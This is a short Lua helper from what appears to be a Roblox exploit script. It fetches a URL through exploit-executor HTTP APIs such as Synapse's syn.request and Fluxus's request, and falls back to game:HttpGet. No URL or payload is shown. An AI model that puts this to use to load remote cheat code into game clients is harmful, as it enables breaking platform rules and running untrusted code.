-- universal fetch (client‑side exploits & Studio fallback)
local function fetch(url)
	if syn and syn.request then
		return syn.request({Url=url,Method="GET"}).Body
	elseif http_request then
		local r=http_request({Url=url,Method="GET"});return type(r)=="table" and r.Body or r
	elseif fluxus and fluxus.request then
		return fluxus.request({Url=url,Method="GET"}).Body
	elseif request then
		local r=request({Url=url,Method="GET"});return type(r)=="table" and r.Body or r
	elseif game.HttpGet then
		return game:HttpGet(url)
	else
		error("No HTTP method")
	end
end

